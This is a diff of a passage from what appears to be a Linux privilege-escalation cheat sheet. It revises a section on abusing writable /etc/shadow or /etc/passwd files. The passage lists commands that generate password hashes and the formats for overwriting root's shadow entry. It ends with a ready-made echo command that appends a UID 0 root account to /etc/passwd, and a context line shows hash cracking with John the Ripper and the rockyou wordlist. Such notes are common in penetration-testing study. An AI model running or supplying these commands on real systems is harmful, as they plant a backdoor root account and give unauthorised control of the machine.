@@ -53,13 +53,14 @@ john --wordlist=/usr/share/wordlists/rockyou.txt hash
 ```
 ### Writable /etc/shadow OR /etc/passwd ✡️
 ```bash
-mkpasswd -m sha-512 <new-password>
-OR
 openssl passwd <password>
-OR
+mkpasswd -m sha-512 <new-password>
 openssl passwd -1 -salt <username> <password>
 
-change root password from /etc/shadow OR Add to end the /etc/passwd
+change root password from /etc/shadow
+Format change to /etc/shadow = root:<password>:19966:0:99999:7:::
+
+Add to end the /etc/passwd
 Format add to /etc/passwd = <username>:<passwordhash>:0:0:root:/root:/bin/bash
 
 echo 'mobin:$1$8VO3cUZu$als/bleGjZ3SVjE5EGzvh/:0:0:root:/root:/bin/bash' >> /etc/passwd
